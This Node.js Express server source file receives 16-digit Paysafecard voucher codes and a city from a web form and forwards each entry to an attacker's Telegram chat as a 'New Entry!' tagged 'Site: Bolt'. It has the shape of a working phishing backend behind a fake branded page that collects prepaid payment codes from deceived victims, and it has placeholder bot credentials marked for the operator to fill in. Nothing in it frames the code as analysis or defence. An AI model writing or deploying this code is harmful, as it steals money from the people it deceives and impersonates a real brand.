const express = require('express');
const axios = require('axios');
const cors = require('cors');
const app = express();

app.use(cors());
app.use(express.json());

const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';   // ← Change this
const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID_HERE';       // ← Change this

app.post('/submit', async (req, res) => {
    const { code, city } = req.body;

    if (!code || code.length < 16) {
        return res.status(400).json({ error: 'Invalid code' });
    }

    const time = new Date().toISOString().slice(0, 19).replace('T', ' ');

    const message = `🔴 New Entry!\n\n` +
                    `Site: Bolt\n` +
                    `Location: ${city || 'Not selected'}\n` +
                    `Paysafecard 16 digit code: ${code}\n` +
                    `Time: ${time}`;

    try {
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'HTML'
        });
        res.json({ success: true });
    } catch (err) {
        console.error(err);
        res.status(500).json({ error: 'Telegram error' });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
